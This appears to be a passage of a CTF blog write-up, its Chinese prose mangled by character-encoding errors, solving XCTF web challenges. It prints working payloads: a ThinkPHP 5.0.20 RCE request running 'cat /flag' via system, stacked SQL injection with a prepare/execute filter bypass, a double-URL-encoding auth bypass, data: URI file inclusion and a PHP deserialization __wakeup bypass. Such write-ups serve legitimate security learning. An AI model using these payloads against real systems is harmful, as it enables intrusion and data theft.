    <content type="html"><![CDATA[<h1 id="baby_web"><a class="markdownIt-Anchor" href="#baby_web"></a> baby_web</h1><p>æç¤ºä¸ºåˆå§‹é¡µé¢ï¼Œç”¨dirsearchæ‰«äº†ä¸‹æ²¡ç»“æœï¼Œç”¨brupéå†1-1000çš„phpé¡µé¢ä¹Ÿæ²¡ä»€ä¹ˆåµç”¨ï¼Œè¿˜æ˜¯çœ‹wpå§ ğŸ˜­</p><p>è®¿é—®åˆå§‹é¡µé¢index.phpæŸ¥çœ‹å¤´éƒ¨ï¼Œå±…ç„¶è¿™ä¹ˆç®€å•ï¼ˆä»¥åè¿˜æ˜¯å¤šç”¨burpçš„repeateræ¨¡å—ï¼Œedgeè‡ªå¸¦çš„çœ‹çš„å°‘ï¼‰</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608162439760.png" alt="image-20220608162439760" /></p><p>è¿™é‡Œè®¿é—®index.phpè¢«é‡å®šå‘åˆ°1.phpä¸­ï¼Œæ˜¯é€šè¿‡<strong>å“åº”å¤´Location</strong>æ¥å®ç°çš„ï¼ŒçŠ¶æ€ç 302è·³è½¬</p><hr /><h1 id="ics-06"><a class="markdownIt-Anchor" href="#ics-06"></a> ics-06</h1><p>äº‘å¹³å°æŠ¥è¡¨ä¸­å¿ƒæ”¶é›†äº†è®¾å¤‡ç®¡ç†åŸºç¡€æœåŠ¡çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®è¢«åˆ é™¤äº†ï¼Œåªæœ‰ä¸€å¤„ç•™ä¸‹äº†å…¥ä¾µè€…çš„ç—•è¿¹ã€‚</p><p>è¿›æŠ¥è¡¨ä¸­å¿ƒçœ‹äº†çœ‹ï¼Œå‘ç°ç¡®è®¤æŒ‰é’®æ²¡å•¥ç”¨ï¼Œä¹Ÿæ²¡æ‰¾åˆ°å…¶ä»–æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå‘ç°urlä¸­idå€¼ï¼Œç»™ä»–éšä¾¿èµ‹å‡ ä¸ªå€¼ï¼Œé¡µé¢è¿”å›ç éƒ½æ˜¯200</p><p>æ‰€ä»¥å¯åˆ¤æ–­ä¸ºidå€¼çš„é¡µé¢æšä¸¾ï¼Œç”¨burpçš„intruderæ¨¡å— (<strong>ç»™çš„æç¤ºæ˜¯çœŸçš„å°‘</strong>)</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609110933902.png" alt="image-20220609110933902" /></p><p>id = 2333æ—¶é¡µé¢å¤§å°å‘ç”Ÿå˜åŒ–ï¼ŒæŸ¥çœ‹è·å¾—flag</p><p>è¯´å®è¯ï¼Œè¿™ç§è¦çˆ†ç ´çš„é¢˜å‡ºçš„ä¸å¥½ï¼Œæç¤ºç»™çš„å°‘ï¼Œè€Œä¸”<strong>æ­£ç¡®çš„æ•°å­—åˆç‰¹åˆ«å¤§</strong>ï¼Œå¾ˆéš¾åšå‡ºæ¥</p><hr /><h1 id="training-www-robots"><a class="markdownIt-Anchor" href="#training-www-robots"></a> Training-WWW-Robots</h1><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608162820206.png" alt="image-20220608162820206" /></p><p>æ ¹æ®æç¤ºï¼Œrobotsåè®®ä¸­æœ‰æ—¶ä¼šæ³„éœ²ç½‘ç«™ç›®å½•ç»“æ„ï¼Œè®¿é—®robots.txtå¾—åˆ°flagçš„é¡µé¢fl0g.phpï¼Œå’Œæ–°æ‰‹åŒºçš„é¢˜ä¸€æ ·</p><hr /><h1 id="php2"><a class="markdownIt-Anchor" href="#php2"></a> PHP2</h1><p>é¡µé¢æç¤º <em><strong>Can you anthenticate to this website?</strong></em></p><p>è¿™æ˜¯å…³äºè®¤è¯ï¼Œä»£ç å®¡è®¡ç›¸å…³ï¼Œä½†ç»™çš„æç¤ºå¤ªå°‘äº†ï¼Œå°è¯•äº†ä¸‹æ— æœï¼Œç›´æ¥çœ‹wpï¼Œå‘ç° <strong>index.phps</strong>ï¼Œ æ–°å§¿åŠ¿æºç è·å–é€”å¾„ get :happy:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;admin&quot;</span>===<span class="hljs-variable">$_GET</span>[id]) &#123;<br>  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$_GET</span>[id] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[id]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id] == <span class="hljs-string">&quot;admin&quot;</span>)<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡GETä¼ å…¥idå€¼ä¸adminè¿›è¡Œå¼ºæ¯”è¾ƒï¼Œè‹¥ç›¸ç­‰åˆ™é€€å‡ºï¼Œå¦åˆ™å¯¹å®ƒurldecodeåå†æ¬¡è¿›è¡Œå¼±æ¯”è¾ƒæ‹¿åˆ°key</p><p>æ€è·¯æ˜¯å¯¹adminçš„ä¸€éƒ¨åˆ†è¿›è¡Œurlencodeç¼–ç è¿›è¡Œç»•è¿‡ï¼Œä½†è¿™é‡Œéœ€è¦æ˜ç™½ä¸€ç‚¹ï¼Œidå€¼åœ¨ä¼ å…¥æ—¶æµè§ˆå™¨æœ¬èº«æ‰§è¡Œä¸€æ¬¡urldecodeè§£ç ï¼Œæ‰€ä»¥è¦ç¼–ç ä¸¤æ¬¡</p><blockquote><p>urlç¼–ç è¡¨æŸ¥çœ‹åœ°å€ : <a href="http://www.urlencode.com.cn/">UrlEncodeç¼–ç å’ŒUrlDecodeè§£ç -åœ¨çº¿URLç¼–ç è§£ç å·¥å…·</a></p></blockquote><p>diåˆå§‹å€¼ä¸ºadminï¼Œæˆ‘ä»¬å¯¹aè¿›è¡Œç¼–ç <code>%61</code>ï¼Œå†å¯¹<code>%61</code>è¿›è¡Œç¼–ç <code>%25%36%31</code>æ‰€ä»¥æœ€ç»ˆä¸º <em><strong>id=%25%36%31dmin</strong></em></p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608165812303.png" alt="image-20220608165812303" /></p><p>æˆ–è€…ç›´æ¥ç”¨burpé‡Œçš„Decoderæ¨¡å—å¯¹adminè¿›è¡Œä¸¤æ¬¡ç¼–ç </p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608170051702.png" alt="image-20220608170051702" /></p><hr /><h1 id="php_rce"><a class="markdownIt-Anchor" href="#php_rce"></a> php_rce</h1><p>thinkphp V5.0.20ç‰ˆæœ¬çš„RCEæ¼æ´ï¼Œç½‘ä¸Šæ‰¾ä¸€æ‰¾å…¬å¼€çš„POC</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609170216160.png" alt="image-20220609170216160" /></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">GET ?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1<br>GET ?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag<br></code></pre></td></tr></table></figure><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609170307933.png" alt="" /></p><p>å…·ä½“åˆ©ç”¨ç»†èŠ‚è¿˜æ²¡æ¥å¾—åŠåˆ†æå¤ç°ï¼Œä¸»è¦æ˜¯æ¡†æ¶ä¸­methodæ–¹æ³•è¿‡æ»¤ä¸ä¸¥å¯¼è‡´çš„RCEï¼Œä»¥åæœ‰æ—¶é—´å†çœ‹å§</p><hr /><h1 id="web_php_include"><a class="markdownIt-Anchor" href="#web_php_include"></a> Web_php_include</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br><span class="hljs-variable">$page</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br><span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&quot;php://&quot;</span>)) &#123;<br>    <span class="hljs-variable">$page</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php://&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$page</span>);<br>&#125;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡GETæ–¹å¼ä¼ é€’pageå˜é‡ï¼Œå¹¶ä¸”åˆ¤æ–­æ˜¯å¦åŒ…å«&quot;<strong>php://</strong>&quot;åè®®å¤´ï¼Œå°†å®ƒæ›¿æ¢ä¸ºç©ºï¼Œæœ€ååŒ…å«è¯¥pageå˜é‡</p><p>è¿™é‡Œå°±æ¶‰åŠåˆ°phpæ–‡ä»¶åŒ…å«çš„ç›¸å…³çŸ¥è¯†ï¼Œå¥½ä¹…æ²¡åšäº†ï¼Œç°åœ¨åŠ æ·±ä¸‹å°è±¡</p><h2 id="æ–‡ä»¶åŒ…å«"><a class="markdownIt-Anchor" href="#æ–‡ä»¶åŒ…å«"></a> æ–‡ä»¶åŒ…å«</h2><p>phpä¸­æ–‡ä»¶åŒ…å«ä¸»è¦ä½œç”¨å°±æ˜¯å¼•ç”¨è¢«åŒ…å«æ–‡ä»¶çš„ä»£ç æˆ–è€…å˜é‡ï¼Œè¾¾åˆ°ä»£ç å¤ç”¨çš„ç›®çš„ï¼Œç±»ä¼¼äºCè¯­è¨€çš„includeå’Œpythonä¸­çš„importï¼Œ<strong>åˆ©ç”¨ç‚¹åœ¨äºè¢«åŒ…å«çš„æ–‡ä»¶ä¼šä»¥phpæ–¹å¼æ¥è§£æ</strong>ï¼Œä¸‹é¢æ˜¯å››ç§phpæ–‡ä»¶åŒ…å«çš„ç›¸å…³å‡½æ•°</p><ul><li><a href="http://www.php.net/manual/en/function.include.php">include()</a></li><li><a href="http://php.net/manual/en/function.include-once.php">include_once()</a></li><li><a href="http://php.net/manual/en/function.require.php">require()</a></li><li><a href="http://php.net/manual/en/function.require-once.php">require_once()</a></li></ul><p>include()ä¸require()å‡½æ•°ä¸åŒç‚¹åœ¨äºï¼Œå‰è€…è‹¥æ–‡ä»¶åŒ…å«å‡ºé”™(æ–‡ä»¶ä¸å­˜åœ¨ç­‰)åªä¼šæå‡ºè­¦å‘Šï¼Œç»§ç»­æ‰§è¡Œåç»­è¯­å¥ï¼›åè€…å‡ºé”™æ—¶ä¼šè§¦å‘fatal errorä»è€Œç›´æ¥é€€å‡ºï¼Œä¸æ‰§è¡Œåç»­è¯­å¥</p><h3 id="lfilocal-file-inclusion"><a class="markdownIt-Anchor" href="#lfilocal-file-inclusion"></a> LFI(Local File Inclusion)</h3><p>æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œé¡¾åæ€ä¹‰ï¼ŒæŒ‡çš„æ˜¯èƒ½æ‰“å¼€å¹¶åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ã€‚å¤§éƒ¨åˆ†æƒ…å†µä¸‹é‡åˆ°çš„æ–‡ä»¶åŒ…å«æ¼æ´éƒ½æ˜¯LFIã€‚</p><h3 id="rfiremote-file-inclusion"><a class="markdownIt-Anchor" href="#rfiremote-file-inclusion"></a> RFI(Remote File Inclusion)</h3><p>è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ã€‚æ˜¯æŒ‡èƒ½å¤ŸåŒ…å«è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¹¶æ‰§è¡Œã€‚ç”±äºè¿œç¨‹æœåŠ¡å™¨çš„æ–‡ä»¶æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå› æ­¤æ¼æ´ä¸€æ—¦å­˜åœ¨å±å®³æ€§ä¼šå¾ˆå¤§ã€‚<br />ä½†RFIçš„åˆ©ç”¨æ¡ä»¶è¾ƒä¸ºè‹›åˆ»ï¼Œéœ€è¦php.iniä¸­è¿›è¡Œé…ç½®</p><ul><li>allow_url_fopen = On</li><li>allow_url_include = On</li></ul><blockquote><p>åœ¨php.iniä¸­ï¼Œallow_url_fopené»˜è®¤ä¸€ç›´æ˜¯Onï¼Œè€Œallow_url_includeä»php5.2ä¹‹åå°±é»˜è®¤ä¸ºOffã€‚</p></blockquote><p>ç›´æ¥å¼•ç”¨å¤§ä½¬çš„åšå®¢ <a href="https://blog.csdn.net/Fly_hps/article/details/80926992">PHPæ¼æ´å…¨è§£â€”â€”â€”â€”10ã€PHPæ–‡ä»¶åŒ…å«æ¼æ´_FLy_é¹ç¨‹ä¸‡é‡Œçš„åšå®¢-CSDNåšå®¢</a></p><p>æ–‡ä»¶åŒ…å«å¯åˆ©ç”¨çš„ä¼ªåè®®æœ‰</p><ul><li>php://input</li><li>php://filter</li><li>phar://</li><li>zip://</li><li>data:URI schema</li></ul><p>æœ¬é¢˜å°†php://åè®®banæ‰(å¯ä»¥ç”¨PHP://å¤§å†™ç»•è¿‡ï¼Œstr_replaceå‡½æ•°çš„ç»•è¿‡)ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ç”¨å…¶ä»–åè®®ä»£æ›¿ï¼Œæµ‹è¯•å‘ç° <strong>data:URI schema</strong> å¯è¡Œ</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609201524626.png" alt="image-20220609201524626" /></p><p>è®¿é—®äº†ä¸‹å•¥éƒ½æ²¡æœ‰ğŸ˜©å¯¹å®ƒè¿›è¡ŒcatæŸ¥çœ‹å†…å®¹ï¼Œå‘ç°æ²¡ä»€ä¹ˆä½œç”¨(åæ¥æ‰å‘ç°flag.phpå†…å®¹å’Œindex.phpä¸€æ¨¡ä¸€æ ·ï¼Œflagè—èµ·æ¥äº†ï¼Œå‘ï¼)</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609204204688.png" alt="image-20220609204204688" /></p><p>è¿™é¢˜è€ƒå¯Ÿæ–‡ä»¶åŒ…å«çš„ä¼ªåè®®åº”ç”¨ä»¥åŠç›¸å…³ç»•è¿‡å§¿åŠ¿ï¼Œä½†æœ€åçš„æŸ¥æ‰¾flagç¯èŠ‚å±å®æŠŠæˆ‘æ•´ä¸ä¼šäº†</p><hr /><h1 id="supersqli"><a class="markdownIt-Anchor" href="#supersqli"></a> supersqli</h1><p>çœ‹é¢˜ç›®å°±æ˜¯sqlæ³¨å…¥äº†ï¼Œç”¨çš„sqlmapè·‘äº†ä¸‹ï¼Œé‰´å®šä¸ºå¸ƒå°”ç›²æ³¨ï¼Œçˆ†å‡ºæ¥ä¸€ä¸ªæ•°æ®åº“åï¼Œä½†æ˜¯è¡¨æŠ¥ä¸å‡ºæ¥ğŸ’</p><p>æ²¡åŠæ³•ï¼Œåªèƒ½æ‰‹å·¥æ³¨å…¥äº†ï¼Œå°è¯•äº†ä¸‹injectä¸ºæ³¨å…¥ç‚¹ï¼Œåˆ¤æ–­æ³¨å…¥ç±»å‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=1 # æ­£å¸¸å›æ˜¾</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> # æ— å›æ˜¾<br></code></pre></td></tr></table></figure><p>åˆ¤æ–­ä¸€ä¸‹ä¸ºæ•°å­—æ³¨å…¥, ä½¿ç”¨order by åˆ¤æ–­åˆ—æ•°ï¼Œæœ‰ä¸¤åˆ—</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 1 #</span><br></code></pre></td></tr></table></figure><p>è”åˆæŸ¥è¯¢</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,database() #</span><br></code></pre></td></tr></table></figure><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609234223032.png" alt="" /></p><p>å‘ç°selectè¢«æ­£åˆ™banæ‰äº†ï¼Œå°è¯•å…¶ä»–ç»•è¿‡å§¿åŠ¿ï¼Œå‘ç°å †å æ³¨å…¥å¯è¡Œ</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609234501271.png" alt="image-20220609234501271" /></p><p>çœ‹ä¸€çœ‹è¡¨æƒ…å†µï¼Œæœ‰ä¸¤ä¸ªï¼Œç›²çŒœåœ¨1919810931114514è¡¨é‡Œé¢</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609235729178.png" alt="image-20220609235729178" /></p><p>æŸ¥çœ‹1919810931114514è¡¨çš„å­—æ®µ</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220610000155731.png" alt="image-20220610000155731" /></p><p>æ¥ä¸‹æ¥å°±æ˜¯æŸ¥çœ‹flagå­—æ®µçš„å†…å®¹äº†ï¼Œä½†æ˜¯selectè¢«banæ‰ï¼Œåœ¨ç½‘ä¸Šæ‰¾çš„wpä¸­ä½¿ç”¨<strong>é¢„ç¼–è¯‘</strong>ç»•è¿‡è¿›è¡ŒæŸ¥è¯¢</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;;sEt @sql = CONCAT(&#x27;</span>se<span class="hljs-string">&#x27;,&#x27;</span>lect <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>`;<span class="hljs-string">&#x27;);prEpare stmt from @sql;EXECUTE stmt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220610000505321.png" alt="image-20220610000505321" /></p><hr /><h1 id="web_php_unserialize"><a class="markdownIt-Anchor" href="#web_php_unserialize"></a> Web_php_unserialize</h1><p>å®¡è®¡æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]); <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;index.php&quot;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¦ç»•è¿‡pre_matchçš„æ­£åˆ™åŒ¹é…ï¼Œä¹Ÿè¦ç»•è¿‡__wakeup()å‡½æ•°ï¼Œå°†<strong>file</strong>æˆå‘˜å˜é‡è®¾ä¸º <em><strong>fl4g.php</strong></em>ï¼Œåºåˆ—åŒ–è„šæœ¬ä¸ä¸Šé¢˜ä¸€è‡´</p><p>preg_matchæ­£åˆ™ä¸º <code>/[oc]:\d+:/i</code>  ocè¡¨ç¤ºoæˆ–è€…cå­—æ¯ï¼ŒåŠ ä¸Šå†’å·ï¼Œ<strong>\d</strong>è¡¨ç¤º0-9æ•°å­—ï¼Œ**+**è¡¨ç¤ºå‰é¢é‡å¤ï¼Œå†åŠ ä¸€ä¸ªå†’å·ï¼Œ/iè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609020433924.png" alt="image-20220609020433924" /></p><blockquote><p>æ­£åˆ™åŒ¹é…æµ‹è¯• <a href="https://c.runoob.com/front-end/854/">æ­£åˆ™è¡¨è¾¾å¼åœ¨çº¿æµ‹è¯• | èœé¸Ÿå·¥å…· (runoob.com)</a></p></blockquote><p>è¿™é‡Œåœ¨O:4ä¸­æ·»åŠ ä¸€ä¸ª+å·ç»•è¿‡æ­£åˆ™(4å’Œæ­£æ•°4(<strong>+4</strong>)åœ¨phpä¸­å®Œå…¨ä¸€è‡´)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span>  <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;fl4g.php&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$xctf</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>();<br><span class="hljs-variable">$x</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$xctf</span>);<br><span class="hljs-variable">$x</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:4&#x27;</span>, <span class="hljs-string">&#x27;O:+4&#x27;</span>, <span class="hljs-variable">$x</span>);<span class="hljs-comment">//ç»•è¿‡preg_match()</span><br><span class="hljs-variable">$x</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:1:&#x27;</span>, <span class="hljs-string">&#x27;:2:&#x27;</span>, <span class="hljs-variable">$x</span>);<span class="hljs-comment">//ç»•è¿‡__wakeup()</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$x</span>);<br></code></pre></td></tr></table></figure><p>å¾—åˆ°<strong>var</strong>çš„ä¼ å€¼<code>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><blockquote><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸èƒ½åœ¨åºåˆ—åŒ–åçš„å­—ç¬¦è¿›è¡Œä¿®æ”¹ï¼Œå› ä¸ºåºåˆ—åŒ–åæœ‰ä¹±ç ä¸èƒ½ç›´æ¥å¤åˆ¶ï¼Œå¯¼è‡´base64åŠ å¯†é”™è¯¯ï¼Œéœ€è¦åœ¨phpè„šæœ¬ä¸­è¿›è¡Œä¿®æ”¹å’Œbase64ç¼–ç ã€‚</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220609020747760.png" alt="image-20220609020747760" /></p><hr /><h1 id="unserialize3"><a class="markdownIt-Anchor" href="#unserialize3"></a> unserialize3</h1><p>æœ¬é¢˜è€ƒæŸ¥phpä¸­ååºåˆ—åŒ–çŸ¥è¯†ï¼Œå…¶ä¸­åŒ…æ‹¬é­”æœ¯æ–¹æ³•____ sleep() å’Œ ____ wakeup()</p><p>åœ¨ä½¿ç”¨serialize()æ–¹æ³•æ—¶ä¼š**é¦–å…ˆè°ƒç”¨sleep()<strong>æ–¹æ³•ï¼ŒåŒç†ï¼Œåœ¨unserialize()æ—¶ä¼š</strong>é¦–å…ˆè°ƒç”¨wakeup()**æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆåºåˆ—åŒ–ä¸€ä¸ªxctfç±»çš„å¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«flagæˆå‘˜ï¼Œå€¼ä¸ºå­—ç¬¦â€™111â€™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$flag</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span 